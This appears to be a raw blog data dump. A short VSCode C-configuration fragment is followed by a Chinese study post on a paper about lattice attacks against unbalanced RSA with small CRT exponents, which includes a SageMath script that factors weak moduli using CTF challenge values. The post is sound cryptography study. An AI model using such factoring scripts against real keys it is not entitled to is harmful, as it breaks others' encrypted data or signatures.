class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;_UNICODE&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;compilerPath&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;C:/TDM-GCC-64/bin/g++.exe&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;cStandard&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;c11&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;cppStandard&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;c++20&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;intelliSenseMode&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;gcc-x64&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;macFrameworkPath&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;browse&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;path&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">          <span class=\"string\">&quot;C:/TDM-GCC-64/lib/gcc/x86_64-w64-mingw32/10.3.0/include/*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"string\">&quot;C:/TDM-GCC-64/lib/gcc/x86_64-w64-mingw32/10.3.0/include/c++/*&quot;</span></span><br><span class=\"line\">        <span class=\"punctuation\">]</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">  <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;version&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure></li>\n</ol>\n<p>搬砖完毕（逃</p>\n<h2 id=\"中文乱码\"><a href=\"#中文乱码\" class=\"headerlink\" title=\"中文乱码\"></a>中文乱码</h2><p>VSCode 中默认终端常为 PowerShell ，Windows 10 中 PowerShell 默认编码跟随系统，可以通过修改区域设置来改变默认编码： 控制面板-&gt;区域-&gt;更改系统区域设置-&gt;勾选 <code>Beta版：使用Unicode:UTF-8以获取全球语言支持</code>，但这样可能会造成其他应用乱码，笔者就因为这个事情改回去了。</p>\n<h2 id=\"VSCode-使用的注意事项\"><a href=\"#VSCode-使用的注意事项\" class=\"headerlink\" title=\"VSCode 使用的注意事项\"></a>VSCode 使用的注意事项</h2><blockquote>\n<p>虽说 VSCode 好，但有几点注意的，被坑过。。。</p>\n</blockquote>\n<ol>\n<li>不要直接<strong>在文件夹双击打开 .c 文件</strong>启动 VSCode</li>\n<li>不要给 .c 文件起<strong>中文名</strong></li>\n<li>不要在<strong>其他文件夹</strong>（除了你最初配置好的文件夹，比如桌面）中启动 VSCode</li>\n<li>以上配置无法进行<strong>多文件编译</strong></li>\n<li>以上说法仅针对初学者，均不严谨</li>\n</ol>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><blockquote>\n<p><a href=\"https://blog.gztime.cc/posts/2020/6b9b4626/\">Visual Studio Code Guide</a> by GZTime<br><a href=\"https://blog.csdn.net/m0_55005568/article/details/119960552\">https://blog.csdn.net/m0_55005568/article/details/119960552</a></p>\n</blockquote>"},{"title":"小 CRT 指数非平衡 RSA 的密码分析论文分析","date":"2022-05-27T12:25:00.000Z","_content":"\n直接读头晕，翻译更看不懂，就写篇文一点点细啃吧。\n<!--more-->\n\n## 前言\n\n第一次认真看英文论文，也是第一次看论文。\n这篇是 NSSCTF 中 Crypto 题的出题论文，题目非常简单，但是零解（）\n后来在 Destog3 迎新赛的压轴题又看到了几乎一样的题，照着 NSSCTF 的 wp 改了下参数中跑出来了，既然在短时间内能碰见两次，也是缘分，就读读罢。\n\n## 论文翻译\n\n### 引言\n\n论文中写到 $ed=1\\mod\\frac{(p-1)(q-1)}{2}$ （这个我没见过），然后 $ \\gcd(p-1,\\frac{q-1}{2})=1$ ，再然后由CRT给出 $ed=1\\mod p-1$ 且 $ed=1\\mod\\frac{q-1}{2}$ 。\n为了加速 RSA 的解密，有人想用小解密指数 $d$ ，然而 Wiener 先生指出 $d< \\frac{1}{3}N^{\\frac{1}{4}}$ 时可以在多项式时间内爆破出来。\n虽然不能使用小解密指数 $d$ ，但还有一个方法，就是计算 $d_p=d\\mod p-1$ 和 $d_q=d\\mod \\frac{q-1}{2}$ 是比较小的，这样一个 $d$ 称为**小CRT指数**。为了对消息 $m$ 进行签名，可以计算 $m^{d_p}\\mod p$ 和 $m^{d_q}\\mod q$ ，在之前，由于 $d$ 看起来是比较大的，所以也没法攻击（意思应该就是现在可以了）。\n攻破这个系统的最优的算法的时间复杂度在 $O(\\min(\\sqrt{d_p},\\sqrt{d_q}))$ ，同时有趣的是， $p$ 和 $q$ 不平衡时往往会降低 RSA 的安全性。\n令 $q < N^\\beta$ 且 $d_p \\le N^\\delta$ ，当满足 $3\\beta + 2\\delta \\le 1 - \\log_N(4)$ 时可以在 $O(\\log^2(N))$ 复杂度内分解 $N$ ，显然，这个方法只能在 $\\beta < \\frac{1}{3}$ 时有效。\n**关键部分来了**，这里说到，文章中给出了一种构造任意维度的格的方法来将条件提升到 $3\\beta - \\beta^2 + 2\\delta \\le 1 - \\epsilon$ ，这个 $\\epsilon$ 是一个小错误的意思（我也不知道干嘛的）。因此只要 $\\beta < \\frac{3-\\sqrt{5}}{2}=\\hat{\\phi}^2$ ，这个方法就是有效的，当 $\\hat{\\phi}$ 时是黄金比例的共轭（这一段我又不知道在干嘛了）。\n\n### 准备工作\n\n记模 $N$ 环为 $\\mathbb {Z}_N$ ，整数模 $N$ 乘法群为 $\\mathbb{Z}^*_N$\n\n> **真相1**（原文就叫Fact 1，随便翻译意思一下）\n> $(Lenstra, Lenstra and Lov´asz)$\n> 令 $L$ 为一个由 $\\{v_1,...,v_n\\}$ 张成的格，那么 $L^3-reduction$ 算法可以在多项式时间内输出一个以 $\\{v_1^\\prime,...,v_n^\\prime\\}$ 为基的格且这组基满足\n$$\n    \\|v_1^\\prime\\| \\le 2^{\\frac{n-1}{4}} \\ det(L)^\\frac{1}{n} \\ and \\ \\|v_2^\\prime\\| \\le 2^{\\frac{n}{2}} \\ det(L)^\\frac{1}{n-1}\n$$\n\n#### 用 CRT 生成 Key\n\n### 一个模 $p$ 的方法\n\n同余式改写等式过程如下：\n$$\n    ed_p=1 \\mod p-1 \\\\\\\\\n    ed_p+k(p-1)=1 \\ over \\ \\mathbb{Z} \\\\\\\\\n    ed_p-(k+1)=-kp\n$$\n下面假设 $q$ 不整除 $k$ ，否则右式是 $N$ 的倍数然后我们可以获得更强的结果（又是奇怪的翻译），等下再讨论这个。\n此时有多项式\n$$\n    f_p(x,y)=ex-y\n$$\n且该多项式有一根 $(x_0,y_0)=(d_p,k+1) \\ modulo \\ p$\n构造时我们有 $d_p \\le N^\\delta$ ，又 $e < \\frac{(p-1)(q-1)}{2}$ ，就有\n$$\n    \\lvert k+1\\rvert=\\lvert \\frac{ed_p-2}{p-1}\\rvert < \\frac{ed_p}{p-1} < \\frac{q-1}{2}d_p < N^{\\beta + \\delta}\n$$\n定义两个上界 $X=N^\\delta$ 和 $Y=N^{\\beta + \\delta}$ ，则模二元多项式方程 $f_p$ 有一个小根 $(x_0),y_0$ 满足 $\\lvert x_0 \\rvert \\le X$ 且 $\\lvert y_0 \\rvert \\le Y$ ，这个模方程可以用 Howgrave_Grahm 定理转变为一个整数上的方程。\n> **真相2 $(Howgrave-Graham)$**\n> 令 $f(x,y)$ 为一个至多 $\\omega$ 个单项式的和的多项式，假定 $f(x_0,y_0)=0\\mod \\ p^m$ ( $m$ 为正整数)， $\\lvert x_0 \\rvert \\le X$ 且 $\\lvert y_0 \\rvert \\le Y$ 。若 $\\|f(xX,yY)\\| < \\frac{p^m}{\\sqrt{\\omega}}$ ，则 $f(x_0,y_0)=0$ 在整数上成立。\n\n用格约化算法可以找到一个小欧里几得范数的多项式 $f(xX,yY)$ ，第一个方法是构造一个二维的格，这时高斯约化算法可以找到一个最短向量。\n我们选择 $m=1$ ，然后我们使用同样含根 $x_0 \\ modulo \\ p$ 的辅助多项式 $f_0(x)=Nx$ ，因为 $N$ 是 $p$ 的倍数。\n因此， $f_0$ 和 $f_p$ 的每个整数线性组合都有根 $(x_0,y_0) \\ modulo \\ p$ 。\n此时构造一个由多项式 $f_0(xX)$ 和 $f_p(xX,yY)$ 的系数向量张成的格 $L_p$ 。这些系数向量是如下 $(2x2)$ 格基矩阵 $B_p$ 的行向量\n$$\nB_p=\n\\begin{bmatrix}\n    NX \\\\\\\\\n    eX & -Y\n\\end{bmatrix}\n$$\n然后找到一个向量 $v$ 使其欧里几得范数小于 $\\frac{p}{\\sqrt{2}}$ ，这个向量可以被转换成一个满足**真相2**的多项式 $f(x,y)$ 。\n> **引理3** 令 $X=N^\\delta$ 和 $Y=N^{\\beta + \\delta}$ 满足\n$$\n    3\\beta + 2\\delta \\le 1 - log_N(4)\n$$\n则 $L_p$ 有一个最小向量 $v$ 满足 $\\|v\\|<\\frac{p}{\\sqrt{2}}$\n**证明** 由 Minkowski 定理，...呃先不说这个，能用就行（逃\n\n通过**引理3**，我们知道，对每个固定的 $\\epsilon > 0$ ，条件 $3\\beta + 2\\delta \\le 1 - \\epsilon$ 有适当的模量 $N$ （这里我感觉不应该是这么翻译，后面再改）。\n假定我们通过格约化找到了一个 $L_p$ 中的向量 $v$ ，其范数小于 $\\frac{p}{\\sqrt{2}}$ ，令 $v$ 为多项式 $f(xX,yY)$ 的系数向量，应用**真相2**，我们知道 $f(x,y)$ 在整数上有一根 $(x_0,y_0)=(d_p,k+1)$ ，下一个定理将表明这个根可以很容易被找到。\n> **引理4** 令 $v=(c_0,c_1)\\cdot B_p$ 为 $L_p$ 的最短向量且满足 $\\|v\\|<\\frac{p}{\\sqrt{2}}$ 则 $\\lvert c_0 \\rvert = k$ 且 $\\lvert c_1 \\rvert = qd_p$\n**证明** 略\n\n总结如下结论就有如下定理：\n\n> **定理5** 给定一个 RSA 公钥对 $(N,e)$ ，令 $q<N^\\beta,d_p \\le N^\\delta$ 且\n$$\n    3\\beta + 2\\delta \\le 1 - log_N(4)\n$$\n则 $N$ 可以在时间 $O(log^2(N))$ 内被分解。\n**证明** 还是略（\n\n在之前的分析中，我们假设 $q$ 不整除 $k$ ，特殊情况下若 $k=qr$ ( $r \\in \\mathbb{Z}$ )，我们得到了类似于以下更强结果之前的推理（百度翻译的）\n\n>**定理6** 给定一个RSA公钥对$(N,e)$，令$q<N^\\beta,d_p \\le N^\\delta$且\n$$\n    k=qr \\ and \\ 3\\beta + 2\\delta \\le 1 - log_N(4)\n$$\n则 $N$ 可以在时间 $O(log^2(N))$ 内被分解。\n**证明** 又双叒叕是略（\n\n有趣的是，在定理 6 中选择 $\\beta=\\frac{1}{2}$ 会有一个界 $\\delta \\le \\frac{1}{4}-log_N(4)$ ，这与 Wiener 的界差不多。\n\n### 将界提升到 $\\beta < N^{0.382}$\n\n这里将界提升到 $\\beta < \\frac{3-\\sqrt{5}}{2} \\approx N^{0.382}$ 。\n上面我们使用**真相2**的时候选择 $m=1$ ，现在一般化方法到任意 $m$ 。\n定义 $x$ 移位多项式（这个也是百度翻译）\n$$\n    g_{m,i,j}(x,y)=N^{max(0,m-j)}x^if^j_p(x,y)\n$$\n注意到，每个多项式 $g_{m,i,j}$ 的线性组合都有零点 $(x_0,y_0)=(d_p,k+1)\\ modulo \\ p^m$ 。\n确定一个格维数 $n$ ，然后用 $g_{m,i,j}(xX,yY)$ 的系数向量来构造一个 $n$ 维格 $L_p$ ，其中 $j=0...n-1$ ， $i=n-j-i$ 。参数 $m$ 是 $n$ 的函数且须进行优化。\n比如选取 $n=4$ ， $m=2$ ，格 $L_p$ 由如下行向量张成\n$$\nB_p=\n\\begin{bmatrix}\n    N^2X^3 \\\\\\\\\n    eNX^3 & -NX^2Y \\\\\\\\\n    e^2X^3 & -2eX^2Y & XY^2 \\\\\\\\\n    e^3X^3 & -3e^2X^2Y & 3eXY^2 & -Y^3\n\\end{bmatrix}\n$$\n注意到，之前的 $L_p$ 和这里的 $L_p(2)$ 是一样的。\n为了满足**真相2**，我们一个满足范数小于 $\\frac{p^m}{\\sqrt{n}}$ 系数向量 $v$ ，如下引理给出了一个找这样一个向量的条件\n> **引理7** 对每个确定的 $\\epsilon>0$ ，令 $X=\\frac{n+1}{2}N^\\delta$ ， $Y=\\frac{n+1}{2}N^{\\beta+\\delta}$ 满足\n$$\n    3\\beta - \\beta^2 + 2\\delta \\le 1 - \\epsilon\n$$\n然后用 LLL 算法可以在 $L_p(n)$ 中找到一个向量 $v$ 满足范数小于 $\\frac{p^m}{\\sqrt{n}}$ 。\n**证明** 略（\n\n现在我们可以用上面的**引理7**与**真相2**结合来构造一个次数为$n$的双变量多项式 $f(x,y)$ ，该多项式最多由 $n$ 个单项式组成，有一根 $(x_0,y_0)$ ，现在问题来到如何提取根 $(x_0,y_0)$ 。\n与**引理4**类似，等下写这\n\n> **引理8** 令 $X=\\frac{n+1}{2}N^\\delta$ ， $Y=\\frac{n+1}{2}N^{\\beta+\\delta}$ ，多项式 $f_p(x,y)=ex-y$ 有一根 $(x_0,y_0)\\ modulo \\ p$ 满足 $\\lvert x_0 \\rvert \\le N^\\delta$ ， $\\lvert y_0 \\rvert \\le N^{\\beta +\\delta}$ ，令 $v$ 为 $L_p(n)$ 中范数小于 $\\frac{p^m}{\\sqrt{n}}$ 的向量（ $v$ 为项式 $f(xX,yY)$ 的系数向量），然后多项式 $p(x,y)=y_0x-x_0y \\in \\mathbb{Z}$ 一定整除 $f(x,y)$ ，我们就可以通过在 $\\mathbb{Z}[x,y]$ 上分解 $f$ 找到 $p$ 。\n**证明** 略（\n\n总结这些结论，就有如下定理：\n\n> **定理9** 给定一个 RSA 公钥对 $(N,e)$ ，令 $q < N^\\beta,d_p \\le N^\\delta$\n且\n$$\n    3\\beta - \\beta^2 + 2\\delta \\le 1 - \\epsilon\n$$\n其中对于适当大的 $N$ （啥叫适当大）， $\\epsilon>0$ 任意小，则我们可以在 $log(N)$ 确定的时间多项式内分解 $N$ 。\n**证明** 略（\n\n### 一个模 $e$ 的方法\n\n好像没啥用？？？不写了\n\n### 方法间的比较\n\n懒得写了（逃\n\n## 实现\n\n### Section3\n\n```python\n#!sage\ndef attack(N, e, beta, delta):\n    N = int(N)\n    e = int(e)\n    if 3*beta+2*delta > 1-log(4, N):\n        print('[-] Attack failed')\n        return None\n    else:\n        X = int(pow(N, delta))\n        Y = int(pow(N, (beta+delta)))\n        Bp = matrix(ZZ, [[N*X, 0], [e*X, -Y]])\n\n        print('[+] LLL reduction...')\n        sv = Bp.LLL()[0]\n\n        c = sv*Bp ^ -1\n        c1 = -abs(c[0])     # k\n        c2 = abs(c[1])      # q*dp\n        q = abs((e*c2+c1*N)//(c1+1))\n        p = N//q\n        print('[+] Attack successed')\n        print('[+] p = {}'.format(p))\n        print('[+] q = {}'.format(q))\n        return p, q\n\n\nif __name__ == '__main__':\n    # from random import *\n\n    # qbits = 900\n    # pbits = 3138\n    # dpbits = 66\n\n    # print('[+] Generating parameters...')\n    # p = random_prime(2 ^ pbits)\n    # q = random_prime(2 ^ qbits)\n    # dp = random_prime(2 ^ dpbits)\n\n    # while True:\n    #     d = (p - 1) * (randint(1 << 895, 1 << 905)) + dp\n\n    #     if GCD(d, (p - 1) * (q - 1)) == 1:\n    #         break\n\n    # e = pow(d, -1, (p - 1) * (q - 1))\n    # N = p * q\n    # Nbits = int(N).bit_length()\n    # beta = qbits/Nbits\n    # delta = dpbits/Nbits\n\n    # print('[+] N = {}'.format(N))\n    # print('[+] e = {}'.format(e))\n    # print('[+] beta = {}'.format(beta))\n    # print('[+] delta = {}'.format(delta))\n    N = 634629908805216799355967956917035397016752766546070169887547308032924761760891699780399214796824214567267154390070522978483366198289411019582748412313710079216359358255867558259121819712947017660972562997658767364245468900343296627500215831311492976020519937654664907394551244233281196085084301881491720946011495516095312100438461444736650645875530160635314476776379821792685906378511085849924665878291761636238890281686290340422138558891124650561389417569572198766305774737557276999432569512459279457704718190818264594575715474945778743504600307881900481338218715405869829242732728780155929040869667117191128487515003629576385308251284254186650906711925117856043812344169291478611645877809590138625462171489233257786403238243625811812424843820945935661305236547254826569192218598933115538295435575896652227458056744204696170806637821332028265957534034435423213071725773547809761130059315592010070432661283749890121832768362711638162670468266766356808625866527581349441814512302739394082651200775637526523353517769267014266507198162521714133402947845712189448974860772495360651769766890958881349140536387282266034095164827944286428551415655867359896643466364963634800962833486281066681776967479689689507887525855059\n    e = 222449729494346666756992460607761795081627331408633195158207067801306565329147681510898658030387508242070227143765893175513890166451777866451978064721778354202341750518999213529606354327894502393449664534948211789294499720405305147950904692085956769722064799513485397504251091294784655828560748848569365844048162038115977508383792426755701835564072424447439243657439872604411430842404037279822672689499520052597008624952368711035998877339177834448061486065262519442303882787242038252503252910254536179033495248788991658972894666551977962064604651051056420818328840034050064445699641044377207422145434076180424757570241966515333860523020888095363402812210233331161015473008660090443148983742164413532587125663777942637230471840611787651285227528953723973668762432241634488008559578459289516131455221246160389933755148774233018937472092674461794244671504900737970090655485320247064558891268178725955788668940079001559604584196657982775865643371046971752485475409807795707098733502124948500727883742572495725371711913411783312068234668792482799143907403909681456144274826087394298716593721198894233809352032011315411881752188433540351647062223660868815946885574427181940281003433351179379410815810916817304563532735699\n    beta = 225/1009\n    delta = 33/2018\n    attack(N, e, beta, delta)\n```\n","source":"_posts/小 CRT 指数非平衡 RSA 的密码分析论文分析.md","raw":"---\ntitle: 小 CRT 指数非平衡 RSA 的密码分析论文分析\ndate: 2022-05-27 20:25:00\ntags: [数学, 抽象代数, Crypto, 论文]\ncategories: 数学\n---\n\n直接读头晕，翻译更看不懂，就写篇文一点点细啃吧。\n<!--more-->\n\n## 前言\n\n第一次认真看英文论文，也是第一次看论文。\n这篇是 NSSCTF 中 Crypto 题的出题论文，题目非常简单，但是零解（）\n后来在 Destog3 迎新赛的压轴题又看到了几乎一样的题，照着 NSSCTF 的 wp 改了下参数中跑出来了，既然在短时间内能碰见两次，也是缘分，就读读罢。\n\n## 论文翻译\n\n### 引言\n\n论文中写到 $ed=1\\mod\\frac{(p-1)(q-1)}{2}$ （这个我没见过），然后 $ \\gcd(p-1,\\frac{q-1}{2})=1$ ，再然后由CRT给出 $ed=1\\mod p-1$ 且 $ed=1\\mod\\frac{q-1}{2}$ 。\n为了加速 RSA 的解密，有人想用小解密指数 $d$ ，然而 Wiener 先生指出 $d< \\frac{1}{3}N^{\\frac{1}{4}}$ 时可以在多项式时间内爆破出来。\n虽然不能使用小解密指数 $d$ ，但还有一个方法，就是计算 $d_p=d\\mod p-1$ 和 $d_q=d\\mod \\frac{q-1}{2}$ 是比较小的，这样一个 $d$ 称为**小CRT指数**。为了对消息 $m$ 进行签名，可以计算 $m^{d_p}\\mod p$ 和 $m^{d_q}\\mod q$ ，在之前，由于 $d$ 看起来是比较大的，所以也没法攻击（意思应该就是现在可以了）。\n攻破这个系统的最优的算法的时间复杂度在 $O(\\min(\\sqrt{d_p},\\sqrt{d_q}))$ ，同时有趣的是， $p$ 和 $q$ 不平衡时往往会降低 RSA 的安全性。\n令 $q < N^\\beta$ 且 $d_p \\le N^\\delta$ ，当满足 $3\\beta + 2\\delta \\le 1 - \\log_N(4)$ 时可以在 $O(\\log^2(N))$ 复杂度内分解 $N$ ，显然，这个方法只能在 $\\beta < \\frac{1}{3}$ 时有效。\n**关键部分来了**，这里说到，文章中给出了一种构造任意维度的格的方法来将条件提升到 $3\\beta - \\beta^2 + 2\\delta \\le 1 - \\epsilon$ ，这个 $\\epsilon$ 是一个小错误的意思（我也不知道干嘛的）。因此只要 $\\beta < \\frac{3-\\sqrt{5}}{2}=\\hat{\\phi}^2$ ，这个方法就是有效的，当 $\\hat{\\phi}$ 时是黄金比例的共轭（这一段我又不知道在干嘛了）。\n\n### 准备工作\n\n记模 $N$ 环为 $\\mathbb {Z}_N$ ，整数模 $N$ 乘法群为 $\\mathbb{Z}^*_N$\n\n> **真相1**（原文就叫Fact 1，随便翻译意思一下）\n> $(Lenstra, Lenstra and Lov´asz)$\n> 令 $L$ 为一个由 $\\{v_1,...,v_n\\}$ 张成的格，那么 $L^3-reduction$ 算法可以在多项式时间内输出一个以 $\\{v_1^\\prime,...,v_n^\\prime\\}$ 为基的格且这组基满足\n$$\n    \\|v_1^\\prime\\| \\le 2^{\\frac{n-1}{4}} \\ det(L)^\\frac{1}{n} \\ and \\ \\|v_2^\\prime\\| \\le 2^{\\frac{n}{2}} \\ det(L)^\\frac{1}{n-1}\n$$\n\n#### 用 CRT 生成 Key\n\n### 一个模 $p$ 的方法\n\n同余式改写等式过程如下：\n$$\n    ed_p=1 \\mod p-1 \\\\\\\\\n    ed_p+k(p-1)=1 \\ over \\ \\mathbb{Z} \\\\\\\\\n    ed_p-(k+1)=-kp\n$$\n下面假设 $q$ 不整除 $k$ ，否则右式是 $N$ 的倍数然后我们可以获得更强的结果（又是奇怪的翻译），等下再讨论这个。\n此时有多项式\n$$\n    f_p(x,y)=ex-y\n$$\n且该多项式有一根 $(x_0,y_0)=(d_p,k+1) \\ modulo \\ p$\n构造时我们有 $d_p \\le N^\\delta$ ，又 $e < \\frac{(p-1)(q-1)}{2}$ ，就有\n$$\n    \\lvert k+1\\rvert=\\lvert \\frac{ed_p-2}{p-1}\\rvert < \\frac{ed_p}{p-1} < \\frac{q-1}{2}d_p < N^{\\beta + \\delta}\n$$\n定义两个上界 $X=N^\\delta$ 和 $Y=N^{\\beta + \\delta}$ ，则模二元多项式方程 $f_p$ 有一个小根 $(x_0),y_0$ 满足 $\\lvert x_0 \\rvert \\le X$ 且 $\\lvert y_0 \\rvert \\le Y$ ，这个模方程可以用 Howgrave_Grahm 定理转变为一个整数上的方程。\n> **真相2 $(Howgrave-Graham)$**\n> 令 $f(x,y)$ 为一个至多 $\\omega$ 个单项式的和的多项式，假定 $f(x_0,y_0)=0\\mod \\ p^m$ ( $m$ 为正整数)， $\\lvert x_0 \\rvert \\le X$ 且 $\\lvert y_0 \\rvert \\le Y$ 。若 $\\|f(xX,yY)\\| < \\frac{p^m}{\\sqrt{\\omega}}$ ，则 $f(x_0,y_0)=0$ 在整数上成立。\n\n用格约化算法可以找到一个小欧里几得范数的多项式 $f(xX,yY)$ ，第一个方法是构造一个二维的格，这时高斯约化算法可以找到一个最短向量。\n我们选择 $m=1$ ，然后我们使用同样含根 $x_0 \\ modulo \\ p$ 的辅助多项式 $f_0(x)=Nx$ ，因为 $N$ 是 $p$ 的倍数。\n因此， $f_0$ 和 $f_p$ 的每个整数线性组合都有根 $(x_0,y_0) \\ modulo \\ p$ 。\n此时构造一个由多项式 $f_0(xX)$ 和 $f_p(xX,yY)$ 的系数向量张成的格 $L_p$ 。这些系数向量是如下 $(2x2)$ 格基矩阵 $B_p$ 的行向量\n$$\nB_p=\n\\begin{bmatrix}\n    NX \\\\\\\\\n    eX & -Y\n\\end{bmatrix}\n$$\n然后找到一个向量 $v$ 使其欧里几得范数小于 $\\frac{p}{\\sqrt{2}}$ ，这个向量可以被转换成一个满足**真相2**的多项式 $f(x,y)$ 。\n> **引理3** 令 $X=N^\\delta$ 和 $Y=N^{\\beta + \\delta}$ 满足\n$$\n    3\\beta + 2\\delta \\le 1 - log_N(4)\n$$\n则 $L_p$ 有一个最小向量 $v$ 满足 $\\|v\\|<\\frac{p}{\\sqrt{2}}$\n**证明** 由 Minkowski 定理，...呃先不说这个，能用就行（逃\n\n通过**引理3**，我们知道，对每个固定的 $\\epsilon > 0$ ，条件 $3\\beta + 2\\delta \\le 1 - \\epsilon$ 有适当的模量 $N$ （这里我感觉不应该是这么翻译，后面再改）。\n假定我们通过格约化找到了一个 $L_p$ 中的向量 $v$ ，其范数小于 $\\frac{p}{\\sqrt{2}}$ ，令 $v$ 为多项式 $f(xX,yY)$ 的系数向量，应用**真相2**，我们知道 $f(x,y)$ 在整数上有一根 $(x_0,y_0)=(d_p,k+1)$ ，下一个定理将表明这个根可以很容易被找到。\n> **引理4** 令 $v=(c_0,c_1)\\cdot B_p$ 为 $L_p$ 的最短向量且满足 $\\|v\\|<\\frac{p}{\\sqrt{2}}$ 则 $\\lvert c_0 \\rvert = k$ 且 $\\lvert c_1 \\rvert = qd_p$\n**证明** 略\n\n总结如下结论就有如下定理：\n\n> **定理5** 给定一个 RSA 公钥对 $(N,e)$ ，令 $q<N^\\beta,d_p \\le N^\\delta$ 且\n$$\n    3\\beta + 2\\delta \\le 1 - log_N(4)\n$$\n则 $N$ 可以在时间 $O(log^2(N))$ 内被分解。\n**证明** 还是略（\n\n在之前的分析中，我们假设 $q$ 不整除 $k$ ，特殊情况下若 $k=qr$ ( $r \\in \\mathbb{Z}$ )，我们得到了类似于以下更强结果之前的推理（百度翻译的）\n\n>**定理6** 给定一个RSA公钥对$(N,e)$，令$q<N^\\beta,d_p \\le N^\\delta$且\n$$\n    k=qr \\ and \\ 3\\beta + 2\\delta \\le 1 - log_N(4)\n$$\n则 $N$ 可以在时间 $O(log^2(N))$ 内被分解。\n**证明** 又双叒叕是略（\n\n有趣的是，在定理 6 中选择 $\\beta=\\frac{1}{2}$ 会有一个界 $\\delta \\le \\frac{1}{4}-log_N(4)$ ，这与 Wiener 的界差不多。\n\n### 将界提升到 $\\beta < N^{0.382}$\n\n这里将界提升到 $\\beta < \\frac{3-\\sqrt{5}}{2} \\approx N^{0.382}$ 。\n上面我们使用**真相2**的时候选择 $m=1$ ，现在一般化方法到任意 $m$ 。\n定义 $x$ 移位多项式（这个也是百度翻译）\n$$\n    g_{m,i,j}(x,y)=N^{max(0,m-j)}x^if^j_p(x,y)\n$$\n注意到，每个多项式 $g_{m,i,j}$ 的线性组合都有零点 $(x_0,y_0)=(d_p,k+1)\\ modulo \\ p^m$ 。\n确定一个格维数 $n$ ，然后用 $g_{m,i,j}(xX,yY)$ 的系数向量来构造一个 $n$ 维格 $L_p$ ，其中 $j=0...n-1$ ， $i=n-j-i$ 。参数 $m$ 是 $n$ 的函数且须进行优化。\n比如选取 $n=4$ ， $m=2$ ，格 $L_p$ 由如下行向量张成\n$$\nB_p=\n\\begin{bmatrix}\n    N^2X^3 \\\\\\\\\n    eNX^3 & -NX^2Y \\\\\\\\\n    e^2X^3 & -2eX^2Y & XY^2 \\\\\\\\\n    e^3X^3 & -3e^2X^2Y & 3eXY^2 & -Y^3\n\\end{bmatrix}\n$$\n注意到，之前的 $L_p$ 和这里的 $L_p(2)$ 是一样的。\n为了满足**真相2**，我们一个满足范数小于 $\\frac{p^m}{\\sqrt{n}}$ 系数向量 $v$ ，如下引理给出了一个找这样一个向量的条件\n> **引理7** 对每个确定的 $\\epsilon>0$ ，令 $X=\\frac{n+1}{2}N^\\delta$ ， $Y=\\frac{n+1}{2}N^{\\beta+\\delta}$ 满足\n$$\n    3\\beta - \\beta^2 + 2\\delta \\le 1 - \\epsilon\n$$\n然后用 LLL 算法可以在 $L_p(n)$ 中找到一个向量 $v$ 满足范数小于 $\\frac{p^m}{\\sqrt{n}}$ 。\n**证明** 略（\n\n现在我们可以用上面的**引理7**与**真相2**结合来构造一个次数为$n$的双变量多项式 $f(x,y)$ ，该多项式最多由 $n$ 个单项式组成，有一根 $(x_0,y_0)$ ，现在问题来到如何提取根 $(x_0,y_0)$ 。\n与**引理4**类似，等下写这\n\n> **引理8** 令 $X=\\frac{n+1}{2}N^\\delta$ ， $Y=\\frac{n+1}{2}N^{\\beta+\\delta}$ ，多项式 $f_p(x,y)=ex-y$ 有一根 $(x_0,y_0)\\ modulo \\ p$ 满足 $\\lvert x_0 \\rvert \\le N^\\delta$ ， $\\lvert y_0 \\rvert \\le N^{\\beta +\\delta}$ ，令 $v$ 为 $L_p(n)$ 中范数小于 $\\frac{p^m}{\\sqrt{n}}$ 的向量（ $v$ 为项式 $f(xX,yY)$ 的系数向量），然后多项式 $p(x,y)=y_0x-x_0y \\in \\mathbb{Z}$ 一定整除 $f(x,y)$ ，我们就可以通过在 $\\mathbb{Z}[x,y]$ 上分解 $f$ 找到 $p$ 。\n**证明** 略（\n\n总结这些结论，就有如下定理：\n\n> **定理9** 给定一个 RSA 公钥对 $(N,e)$ ，令 $q < N^\\beta,d_p \\le N^\\delta$\n且\n$$\n    3\\beta - \\beta^2 + 2\\delta \\le 1 - \\epsilon\n$$\n其中对于适当大的 $N$ （啥叫适当大）， $\\epsilon>0$ 任意小，则我们可以在 $log(N)$ 确定的时间多项式内分解 $N$ 。\n**证明** 略（\n\n### 一个模 $e$ 的方法\n\n好像没啥用？？？不写了\n\n### 方法间的比较\n\n懒得写了（逃\n\n## 实现\n\n### Section3\n\n```python\n#!sage\ndef attack(N, e, beta, delta):\n    N = int(N)\n    e = int(e)\n    if 3*beta+2*delta > 1-log(4, N):\n        print('[-] Attack failed')\n        return None\n    else:\n        X = int(pow(N, delta))\n        Y = int(pow(N, (beta+delta)))\n        Bp = matrix(ZZ, [[N*X, 0], [e*X, -Y]])\n\n        print('[+] LLL reduction...')\n        sv = Bp.LLL()[0]\n\n        c = sv*Bp ^ -1\n        c1 = -abs(c[0])     # k\n      